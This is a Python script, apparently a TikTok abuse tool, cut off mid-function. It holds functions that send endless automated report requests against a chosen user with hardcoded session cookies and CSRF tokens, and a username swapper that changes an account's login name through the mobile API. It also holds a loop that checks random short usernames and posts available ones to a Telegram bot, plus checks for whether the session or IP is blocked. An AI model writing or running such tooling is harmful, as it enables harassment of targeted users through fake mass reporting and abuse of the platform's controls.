# Source By FaLahAlanezi + WeeX + M3GON + J_Qatar And Edited By @t7ttt7

# Here You Put Your Bot Token In Telegram *Optinal*, If You Dont Want To "LEAVE IT"

token = "Token"

# And Here Put Your Telegram-ID *Optinal*, And like what i said If You Dont Want To "LEAVE IT"

tid = "Telegram-ID"

try:
	 import os,sys,time,base64,codecs,itertools,requests,json,random,user_agent,colorama,re,threading
	 from user_agent import *
	 from colorama import *
except Exception as F:
	print("[ModuleERROR]%s"%(F),"\n\nWait To Download The Modules It takes 1 or 2 minutes\nBe patient please\nDownloading...\n")
	os.system("pip install colorama")
	os.system("pip install json")
	os.system("pip install requests")
	os.system("pip install itertools")
	os.system("pip install user_agent")
	os.system("pip install re")
	os.system("pip install random")
	os.system("pip install os")
	os.system("pip install sys")
	os.system("pip install time")
	os.system("pip install threading")
	os.system("pip install base64")
	os.system("pip install codecs")
	pass

os.system("clear")

b = '\033[30m'
re = '\033[31m'
g = '\033[32m'
ye = '\033[33m'
bl = '\033[34m'
ma = '\033[35m'
cy = '\033[36m'
wh = '\033[37m'
res = '\033[39m'

headerswol = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
"Connection": "close",
"Host": "www.tiktok.com",
"Accept-Encoding": "gzip, deflate",
"Cache-Control": "max-age=0"
}

# The Message Content, Chage It If You Want To

fa = """𖡦-------------------------------𖡦
𖡦    𝐓𝐢𝐤𝐓𝐨𝐤𝐂𝐡𝐞𝐜𝐤𝐞𝐫   𖡦
𖡦-------------------------------𖡦"""

ra = """
𖡦-›New User Hunted UP ✅
𖡦-------------------------------𖡦"""

k ="""𖡦-›User : """

an = """𖡦-------------------------------𖡦
𖡦-› @t7ttt7
𖡦-------------------------------𖡦"""

rad = """ ✓"""

FAQ = """𝙲𝚕𝚒𝚌𝚔 𝚃𝚑𝚎 𝚄𝚜𝚎𝚛 𝚃𝚘 𝙲𝚘𝚙𝚢!"""

boora = False

def animate1():
	        for c in itertools.cycle(['|', '/', '-', '\\']):
	        	if boora:
	        		break
	        	sys.stdout.write(b
	        	+ Style.BRIGHT + '\rLogging in '+c)
	        	time.sleep(0.1)
kir = threading.Thread(target=animate1)

def sessionIDcheck():
	from random import sample
	import string
	while True:
		for i in range(1):
			fls = (''.join(sample(string.ascii_lowercase, 8)))
			url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
		payload = ""
		headers = {
	"Accept": "text/html,application/xhtml+xml,applicationxml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"User-Agent": generate_user_agent(),
	"Connection": "close",
	"Host": "www.tiktok.com",
	"Accept-Encoding": "gzip, deflate",
	"Cache-Control": "max-age=0"
		}
		cookies = {'sessionid': sessionId}
		response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
		post = str (response.json()["status_msg"])
		if post==""or"":
			print(Style.BRIGHT+"""│
└──╼ """+b+'['+g+'✓'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Congrats Your SessionID Is Not Blocked')
			exit()
		else:
			print(Style.BRIGHT+"""│
└──╼ """+b+'['+re+'✘'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+" Invalid SessionID")
			exit()
	

def vpncheck():
	from random import sample
	import string
	for i in range(1):
		fls = (''.join(sample(string.ascii_lowercase, 26)))
		weblog = f'https://www.tiktok.com/@{fls}'
		rq = requests.get(weblog, headers=headerswol)
		if rq.status_code == 404:
			print(Style.BRIGHT+"""│
└──╼ """+b+'['+g+'✓'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+' Congrats Your IP Not Blocked')
		elif rq.status_code == 200:
			print(Style.BRIGHT+"""│
└──╼ """+b+'['+re+'✘'+b+']'+re+' ❯'+wh+'❯'+b+'❯'+wh+''' Your IP Blocked''')

def ttrpn():
	done = 0
	error = 0
	import re as rep
	rpurl = f'https://www.tiktok.com/@{trgt}?'
	req0 = requests.get(rpurl).text
	kr = rep.findall('"pageId":"(.*?)"', req0)
	rk = "".join(kr)
	
	url = 'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web&referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&root_referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&cookie_enabled=true&screen_width=1366&screen_height=768&browser_language=ar&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&browser_online=true&ac=4g&timezone_name=Asia%2FRiyadh&page_referer=https:%2F%2Fwww.tiktok.com%2F&priority_region=&verifyFp=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4&appId=1233&region=SA&appType=m&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6926024599109109250'
	
	headers = {
'Connection': 'close',
'Content-Length': '102',
'Accept': 'application/json, text/plain, */*',
'x-secsdk-csrf-token': '00010000000162d3cecd4226704af4882c9300265af10bf186453cf3514caaa4e1e991b9bb8f1661ca3c679cdcb8',
'tt-csrf-token': 'f1_VMFyM18-uBgTG9vJC4eD9',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
'Content-Type': 'application/json',
'Origin': 'https://www.tiktok.com',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': f'https://www.tiktok.com/@{trgt}?',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
'Cookie': f'tt_webid_v2=6926024599109109250; tt_webid=6926024599109109250; s_v_web_id=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4; ttwid=1%7CuU0ZIsyDyN3VZI2n8WRgeKbCOnBi7rzo0O5ubfexN7c%7C1612590836%7C1c5cb49ee5e8f958b35190103ce1ea37891a648dc344853098c36dd9d798f52b; passport_csrf_token=abd11d0de6008199789a3435e8e75597; passport_csrf_token_default=abd11d0de6008199789a3435e8e75597; store-idc=alisg; store-country-code=sa; passport_auth_status=0a5f55489be7d62253f3cc65c0176ba7%2C; passport_auth_status_ss=0a5f55489be7d62253f3cc65c0176ba7%2C; MONITOR_WEB_ID=6926024599109109250; tt_csrf_token=f1_VMFyM18-uBgTG9vJC4eD9; bm_sz=143417F305F360FB0118C9BADE7BD751~YAAQjV4zVhlsoSF3AQAAv67rgQp7ED9jt5NvYj0Ucri/yBeUyvmRkXcWi2eDHYlHW0wpTwESpPnRXxmkYoW9E/KsNiBqI3UFBuNuXG8UOGOC9d7sFMXmUiVbSkOLf7FjoExOOKL15LPj9uUrOzv5cjtbAffAyPr5BFlNSEqKlnI2dwVvaO/ePjTmPnI8bRVu; ak_bmsc=534206A79B77FE79273D9A7EDC9A593656335E8DE03500007A422160402E1D27~plCNWzOvH1A2FC/nkj4wbm+3SEkDFTrcuF7EmFJUevnxPG7gnA4ztz2BFY2U++v3cWIrbhUxvzZ7VbqU8MLEBjvV2tpMRzjpto54ZD11kQQVJPNvVJAg290g0zBDg8h7vzNtnxNUSwfbY/uczRYON/eKHv+vlVQpGCwbS2QuJ1IJ1SaZ3Tn8KAm/qHeC0AsEF0qLAjbHZ6oeGZkIqQ8549ttsjOGcJf1Z/r21z2ryGnL9bX7aSXbYf55hUs4jjhzw6; csrf_session_id=16de1c6bebf44bdead22d2a860b981cd; _abck=D86CAAA87344DFBC4EA1879ADDCFE240~0~YAAQjV4zViNsoSF3AQAAdsHrgQVhd7nYpEMGPi1mK5lzZpDkUsMCjvl3o7uhtT3194A91L7VlK360ixfuIC7JnpEuuauV1zk4CpHFWmYUgq0chJ14MzzdOMkP+KaUy5KWvBRNbGCXGdNMbCNlkL2Ypwpf6mH1iB5JXMOIQJvUaD8093tadn10craGz62WtISTA16J+wVZMAG61jf151t0lrHRUqCCvGhr8g+cKjoB7rdauEahG0SKMb6QC09vh54gB10JeHmUE/Um53B89EdIn7eba5Zh/TZDeXmTId1+53YOP2vNbjdwBO9V3iNRMmzmcE+gGiL3y53vU+skPPCRcXXZgcRvQ==~-1~||-1||~-1; odin_tt=d548bc753bf1eac32a0b0a9f32d043a91be2495da855b354bdcc396dedd60c5ae8ec9937c9a5870fe89c921bf91cfcd22a125cdd27c9b9fa046d84bb5a679487; sid_guard={sessionId}%7C1612792499%7C21600%7CMon%2C+08-Feb-2021+19%3A54%3A59+GMT; uid_tt=cbfd8822d841fcee65012a2b9c00aab2; uid_tt_ss=cbfd8822d841fcee65012a2b9c00aab2; sid_tt={sessionId}; sessionid={sessionId}; sessionid_ss={sessionId}; bm_sv=5D1B8F7463695E34985F3CB65EE23F72~3Zi09KhBoTVy0gcp7krXeiYcspfhEbPvBWKW53O2BQvC3tKeCoSY2t2p/RxkRBPkmQztk7pJFupkN0nepmaXCeXhBAHGLRahhEdtUvKK2zqnTEfBErg8WZCSDbDKU9RoAjxIv3tHcoNd44xdqMv6/irOZXpwGhCdXaPXSrGpsc4='
	}
	data ={
'object_id': rk,
'owner_id': rk,
'reason': '310',
'report_type': "user"
	}
	count = 0
	while True:
		rq = requests.post(url, json=data, headers=headers).text
		if '{"statusCode":0,"body":{"statusCode":0,"errMsg":"نشكرك على ملاحظاتك"},"errMsg":"نشكرك على ملاحظاتك"}' in rq:
			count +=1
			done += 1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""{Style.BRIGHT}┌╼ {b}[{re}{error}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {re}Error{res}\n{wh}│\n{wh}└╼ {b}[{g}{done}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {g}Done {res}""")
			time.sleep(slep)
		else:
			count +=1
			error += 1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""{Style.BRIGHT}┌╼ {b}[{re}{error}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {re}Error{res}\n{wh}│\n{wh}└╼ {b}[{g}{done}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {g}Done {res}""")

def ttrph():
	done = 0
	error = 0
	import re as rep
	rpurl = f'https://www.tiktok.com/@{trgt}?'
	req0 = requests.get(rpurl).text
	kr = rep.findall('"pageId":"(.*?)"', req0)
	rk = "".join(kr)
	
	url = 'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web&referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&root_referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&cookie_enabled=true&screen_width=1366&screen_height=768&browser_language=ar&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&browser_online=true&ac=4g&timezone_name=Asia%2FRiyadh&page_referer=https:%2F%2Fwww.tiktok.com%2F&priority_region=&verifyFp=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4&appId=1233&region=SA&appType=m&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6926024599109109250'
	
	headers = {
'Connection': 'close',
'Content-Length': '102',
'Accept': 'application/json, text/plain, */*',
'x-secsdk-csrf-token': '00010000000162d3cecd4226704af4882c9300265af10bf186453cf3514caaa4e1e991b9bb8f1661ca3c679cdcb8',
'tt-csrf-token': 'f1_VMFyM18-uBgTG9vJC4eD9',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
'Content-Type': 'application/json',
'Origin': 'https://www.tiktok.com',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': f'https://www.tiktok.com/@{trgt}?',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
'Cookie': f'tt_webid_v2=6926024599109109250; tt_webid=6926024599109109250; s_v_web_id=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4; ttwid=1%7CuU0ZIsyDyN3VZI2n8WRgeKbCOnBi7rzo0O5ubfexN7c%7C1612590836%7C1c5cb49ee5e8f958b35190103ce1ea37891a648dc344853098c36dd9d798f52b; passport_csrf_token=abd11d0de6008199789a3435e8e75597; passport_csrf_token_default=abd11d0de6008199789a3435e8e75597; store-idc=alisg; store-country-code=sa; passport_auth_status=0a5f55489be7d62253f3cc65c0176ba7%2C; passport_auth_status_ss=0a5f55489be7d62253f3cc65c0176ba7%2C; MONITOR_WEB_ID=6926024599109109250; tt_csrf_token=f1_VMFyM18-uBgTG9vJC4eD9; bm_sz=143417F305F360FB0118C9BADE7BD751~YAAQjV4zVhlsoSF3AQAAv67rgQp7ED9jt5NvYj0Ucri/yBeUyvmRkXcWi2eDHYlHW0wpTwESpPnRXxmkYoW9E/KsNiBqI3UFBuNuXG8UOGOC9d7sFMXmUiVbSkOLf7FjoExOOKL15LPj9uUrOzv5cjtbAffAyPr5BFlNSEqKlnI2dwVvaO/ePjTmPnI8bRVu; ak_bmsc=534206A79B77FE79273D9A7EDC9A593656335E8DE03500007A422160402E1D27~plCNWzOvH1A2FC/nkj4wbm+3SEkDFTrcuF7EmFJUevnxPG7gnA4ztz2BFY2U++v3cWIrbhUxvzZ7VbqU8MLEBjvV2tpMRzjpto54ZD11kQQVJPNvVJAg290g0zBDg8h7vzNtnxNUSwfbY/uczRYON/eKHv+vlVQpGCwbS2QuJ1IJ1SaZ3Tn8KAm/qHeC0AsEF0qLAjbHZ6oeGZkIqQ8549ttsjOGcJf1Z/r21z2ryGnL9bX7aSXbYf55hUs4jjhzw6; csrf_session_id=16de1c6bebf44bdead22d2a860b981cd; _abck=D86CAAA87344DFBC4EA1879ADDCFE240~0~YAAQjV4zViNsoSF3AQAAdsHrgQVhd7nYpEMGPi1mK5lzZpDkUsMCjvl3o7uhtT3194A91L7VlK360ixfuIC7JnpEuuauV1zk4CpHFWmYUgq0chJ14MzzdOMkP+KaUy5KWvBRNbGCXGdNMbCNlkL2Ypwpf6mH1iB5JXMOIQJvUaD8093tadn10craGz62WtISTA16J+wVZMAG61jf151t0lrHRUqCCvGhr8g+cKjoB7rdauEahG0SKMb6QC09vh54gB10JeHmUE/Um53B89EdIn7eba5Zh/TZDeXmTId1+53YOP2vNbjdwBO9V3iNRMmzmcE+gGiL3y53vU+skPPCRcXXZgcRvQ==~-1~||-1||~-1; odin_tt=d548bc753bf1eac32a0b0a9f32d043a91be2495da855b354bdcc396dedd60c5ae8ec9937c9a5870fe89c921bf91cfcd22a125cdd27c9b9fa046d84bb5a679487; sid_guard={sessionId}%7C1612792499%7C21600%7CMon%2C+08-Feb-2021+19%3A54%3A59+GMT; uid_tt=cbfd8822d841fcee65012a2b9c00aab2; uid_tt_ss=cbfd8822d841fcee65012a2b9c00aab2; sid_tt={sessionId}; sessionid={sessionId}; sessionid_ss={sessionId}; bm_sv=5D1B8F7463695E34985F3CB65EE23F72~3Zi09KhBoTVy0gcp7krXeiYcspfhEbPvBWKW53O2BQvC3tKeCoSY2t2p/RxkRBPkmQztk7pJFupkN0nepmaXCeXhBAHGLRahhEdtUvKK2zqnTEfBErg8WZCSDbDKU9RoAjxIv3tHcoNd44xdqMv6/irOZXpwGhCdXaPXSrGpsc4='
	}
	data ={
'object_id': rk,
'owner_id': rk,
'reason': '306',
'report_type': "user"
	}
	count = 0
	while True:
		rq = requests.post(url, json=data, headers=headers).text
		if '{"statusCode":0,"body":{"statusCode":0,"errMsg":"نشكرك على ملاحظاتك"},"errMsg":"نشكرك على ملاحظاتك"}' in rq:
			count +=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""{Style.BRIGHT}┌╼ {b}[{re}{error}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {re}Error{res}\n{wh}│\n{wh}└╼ {b}[{g}{done}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {g}Done {res}""")
			time.sleep(slep)
		else:
			count +=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""{Style.BRIGHT}┌╼ {b}[{re}{error}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {re}Error{res}\n{wh}│\n{wh}└╼ {b}[{g}{done}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {g}Done {res}""")

def ttrps():
	done = 0
	error = 0
	import re as rep
	rpurl = f'https://www.tiktok.com/@{trgt}?'
	req0 = requests.get(rpurl).text
	kr = rep.findall('"pageId":"(.*?)"', req0)
	rk = "".join(kr)
	
	url = 'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web&referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&root_referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&cookie_enabled=true&screen_width=1366&screen_height=768&browser_language=ar&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&browser_online=true&ac=4g&timezone_name=Asia%2FRiyadh&page_referer=https:%2F%2Fwww.tiktok.com%2F&priority_region=&verifyFp=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4&appId=1233&region=SA&appType=m&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6926024599109109250'
	
	headers = {
'Connection': 'close',
'Content-Length': '102',
'Accept': 'application/json, text/plain, */*',
'x-secsdk-csrf-token': '00010000000162d3cecd4226704af4882c9300265af10bf186453cf3514caaa4e1e991b9bb8f1661ca3c679cdcb8',
'tt-csrf-token': 'f1_VMFyM18-uBgTG9vJC4eD9',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
'Content-Type': 'application/json',
'Origin': 'https://www.tiktok.com',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': f'https://www.tiktok.com/@{trgt}?',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
'Cookie': f'tt_webid_v2=6926024599109109250; tt_webid=6926024599109109250; s_v_web_id=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4; ttwid=1%7CuU0ZIsyDyN3VZI2n8WRgeKbCOnBi7rzo0O5ubfexN7c%7C1612590836%7C1c5cb49ee5e8f958b35190103ce1ea37891a648dc344853098c36dd9d798f52b; passport_csrf_token=abd11d0de6008199789a3435e8e75597; passport_csrf_token_default=abd11d0de6008199789a3435e8e75597; store-idc=alisg; store-country-code=sa; passport_auth_status=0a5f55489be7d62253f3cc65c0176ba7%2C; passport_auth_status_ss=0a5f55489be7d62253f3cc65c0176ba7%2C; MONITOR_WEB_ID=6926024599109109250; tt_csrf_token=f1_VMFyM18-uBgTG9vJC4eD9; bm_sz=143417F305F360FB0118C9BADE7BD751~YAAQjV4zVhlsoSF3AQAAv67rgQp7ED9jt5NvYj0Ucri/yBeUyvmRkXcWi2eDHYlHW0wpTwESpPnRXxmkYoW9E/KsNiBqI3UFBuNuXG8UOGOC9d7sFMXmUiVbSkOLf7FjoExOOKL15LPj9uUrOzv5cjtbAffAyPr5BFlNSEqKlnI2dwVvaO/ePjTmPnI8bRVu; ak_bmsc=534206A79B77FE79273D9A7EDC9A593656335E8DE03500007A422160402E1D27~plCNWzOvH1A2FC/nkj4wbm+3SEkDFTrcuF7EmFJUevnxPG7gnA4ztz2BFY2U++v3cWIrbhUxvzZ7VbqU8MLEBjvV2tpMRzjpto54ZD11kQQVJPNvVJAg290g0zBDg8h7vzNtnxNUSwfbY/uczRYON/eKHv+vlVQpGCwbS2QuJ1IJ1SaZ3Tn8KAm/qHeC0AsEF0qLAjbHZ6oeGZkIqQ8549ttsjOGcJf1Z/r21z2ryGnL9bX7aSXbYf55hUs4jjhzw6; csrf_session_id=16de1c6bebf44bdead22d2a860b981cd; _abck=D86CAAA87344DFBC4EA1879ADDCFE240~0~YAAQjV4zViNsoSF3AQAAdsHrgQVhd7nYpEMGPi1mK5lzZpDkUsMCjvl3o7uhtT3194A91L7VlK360ixfuIC7JnpEuuauV1zk4CpHFWmYUgq0chJ14MzzdOMkP+KaUy5KWvBRNbGCXGdNMbCNlkL2Ypwpf6mH1iB5JXMOIQJvUaD8093tadn10craGz62WtISTA16J+wVZMAG61jf151t0lrHRUqCCvGhr8g+cKjoB7rdauEahG0SKMb6QC09vh54gB10JeHmUE/Um53B89EdIn7eba5Zh/TZDeXmTId1+53YOP2vNbjdwBO9V3iNRMmzmcE+gGiL3y53vU+skPPCRcXXZgcRvQ==~-1~||-1||~-1; odin_tt=d548bc753bf1eac32a0b0a9f32d043a91be2495da855b354bdcc396dedd60c5ae8ec9937c9a5870fe89c921bf91cfcd22a125cdd27c9b9fa046d84bb5a679487; sid_guard={sessionId}%7C1612792499%7C21600%7CMon%2C+08-Feb-2021+19%3A54%3A59+GMT; uid_tt=cbfd8822d841fcee65012a2b9c00aab2; uid_tt_ss=cbfd8822d841fcee65012a2b9c00aab2; sid_tt={sessionId}; sessionid={sessionId}; sessionid_ss={sessionId}; bm_sv=5D1B8F7463695E34985F3CB65EE23F72~3Zi09KhBoTVy0gcp7krXeiYcspfhEbPvBWKW53O2BQvC3tKeCoSY2t2p/RxkRBPkmQztk7pJFupkN0nepmaXCeXhBAHGLRahhEdtUvKK2zqnTEfBErg8WZCSDbDKU9RoAjxIv3tHcoNd44xdqMv6/irOZXpwGhCdXaPXSrGpsc4='
	}
	data ={
'object_id': rk,
'owner_id': rk,
'reason': '3051',
'report_type': "user"
	}
	count = 0
	while True:
		rq = requests.post(url, json=data, headers=headers).text
		if '{"statusCode":0,"body":{"statusCode":0,"errMsg":"نشكرك على ملاحظاتك"},"errMsg":"نشكرك على ملاحظاتك"}' in rq:
			count +=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""{Style.BRIGHT}┌╼ {b}[{re}{error}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {re}Error{res}\n{wh}│\n{wh}└╼ {b}[{g}{done}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {g}Done {res}""")
			time.sleep(slep)
		else:
			count +=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"""{Style.BRIGHT}┌╼ {b}[{re}{error}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {re}Error{res}\n{wh}│\n{wh}└╼ {b}[{g}{done}{b}]{wh} {trgt}{re} ❯{wh}❯{b}❯{wh} {g}Done {res}""")

def ttu():
	uid = uuid.uuid4()
	while True:
		url = "https://api16-normal-c-alisg.tiktokv.com:443/passport/login_name/update/"
		cookies = {"sessionid": f'{sessionId}'}
		headers = {
			"Connection": "close", 
			"Content-Length":"19",
			"x-Tt-Token": "",
			"X-SS-Cookie": "d_ticket=d0ea14600615c5b4ed590ea193e0242a16782", 
			"tt-request-time": "1612540707288", 
			"User-Agent": "TikTok 18.5.0 rv:172025 (iPhone; iOS 13.6.1; ar_SA@calendar=gregorian;numbers=latn) Cronet", 
			"x-tt-passport-csrf-token": f"{sessionId}", 
			"sdk-version": "2", 
			"passport-sdk-version": "5.12.1", 
			"X-SS-STUB": "658BF8A611C037E2DBA4F49839A1535B", 
			"x-tt-store-idc": "alisg", 
			"x-tt-store-region": "sa", 
			"X-SS-DP": "1233", 
			"x-tt-trace-id": "00-72ea8350105f59a9bc99830605e904d1-72ea8350105f59a9-01", 
			"Accept-Encoding": "gzip, deflate", 
			"X-Khronos": "1612540706", 
			"X-Gorgon": "8402a0846000919a57d648714b230a43412a3fb228e177b806bd", 
			"Content-Type": "application/x-www-form-urlencoded"}
		data = {
			"residence": "sa",
			"os_version": "13.6.1",
			"app_id": "1233",
			"iid": uid,
			"app_name": "musical_ly",
			"login_name": f'{user}'}
		
		req = requests.post(url, headers=headers, cookies=cookies, data=data)
		
		if '"message":"success"' in req.text:
			print(Style.BRIGHT+wh+"""│
├──╼ """+wh+b+'['+g+'✓'+b+']'+r+' ❯'+wh+'❯'+b+'❯ '+wh+user+' has been moved ✓' +wh+res)
			send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text=⌯ 𝐓𝐢𝐤𝐓𝐨𝐤-𝐒𝐰𝐚𝐩𝐩𝐞𝐫 ⌯\n⌯ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ⌯\n⌯ `{user}` 𝐇𝐚𝐬 𝐛𝐞𝐞𝐧 𝐦𝐨𝐯𝐞𝐝 ✓𓂅 \n⌯ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ⌯\n⌯ @t7ttt7 \n⌯ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ⌯ &parse_mode=MARKDOWN')
			r = requests.post(send)
		elif '"message":"error"' in req.text:
			print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Error {res}""")
			exit()
		else:
			print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Error {res}""")
			exit()


def rbaee():
	count = 0
	while True:
	       uesr = '.' 
	       chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789_'
	       chars1 = 'qwertyuiopasdfghjklzxcvbnm0123456789___'
	       amount = 1
	       amount = int(amount)
	       length2 = 3
	       length2 = int(length2)
	       length1 = 4
	       length1 = int(length1)
	       flsff = ''
	       for item in range(length1):
	       	flsff += random.choice(chars1)

	       for password1 in range(amount):
	       	   password1 = ''
	       for item in range(length2):
	       	   password1 = ''
	       for item in range(length2):
	       	   password1 += random.choice(chars2)
	       password35="."+password1



	       password2 = ''

	       for item in range(length2):
	       	   password2 = ''
	       for item in range(length2):
	       	   password2 = random.choice(chars2)
	       for item in range(2):
	       	   password3 = ''
	       for item in range(2):
	       	   password3 += random.choice(chars2)
	       password27=password2+"."+password3


	       password4 = ''
	       	
	       for item in range(2):
	       	   password4 = ''
	       for item in range(2):
	       	   password4 += random.choice(chars2)
	       for item in range(1):
	       	   password5= ""
	       for item in range(1):
	       	   password5+=random.choice(uesr)
	       for item in range(1):
	       	   password99 = ''
	       for item in range(1):
	       	    password99 += random.choice(chars2)
	       	    password9 = password4+password5+password99
	       	    
	       mylist = [flsff,password35,password27,flsff,password9,flsff]
	       ffls=""
	       fls = ffls+random.choice(mylist)
	       time.sleep(0.1)
	       url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
	       payload = ""
	       headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "User-Agent": generate_user_agent(),
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"


	       }
	       cookies = {'sessionid': sessionId}
	       response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
	       post = str (response.json()["status_msg"])
	       if post==""or"":
	       	count += 1
	       	print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
	       	send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
	       	with open('found.txt', 'a') as found:
	       		found.write(fls + '\n')
	       	r = requests.post(send)
	       else:
	                count += 1
	                print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls} {re}❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")
def shbh():
	count = 0
	while True:
		uesr = '.'
		chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		amount = 1
